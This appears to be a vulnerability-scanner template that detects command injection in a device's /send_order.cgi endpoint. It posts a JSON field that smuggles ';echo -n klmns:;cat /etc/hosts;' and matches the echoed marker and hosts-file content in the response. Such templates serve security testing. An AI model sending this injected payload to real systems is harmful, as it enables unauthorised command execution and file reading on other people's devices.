http:
- matchers:
  - part: header
    type: word
    words:
    - 'klmns:'
    - 127.0.0.1
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /send_order.cgi?parameter=operation HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    {"opid":"1","name":";echo -n klmns:;cat /etc/hosts;","type":"rest"}

    '
